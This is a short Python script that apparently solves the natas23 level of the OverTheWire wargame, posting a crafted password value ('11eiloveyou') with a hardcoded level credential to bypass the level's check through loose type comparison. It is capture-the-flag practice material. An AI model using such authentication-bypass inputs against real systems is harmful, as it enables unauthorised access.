import requests

username = 'natas23'
password = 'D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE'

url = "http://%s.natas.labs.overthewire.org" % username

data = {
    'passwd': '11eiloveyou'
}

r = requests.post(url, data=data, auth=(username,password))
print(r.text)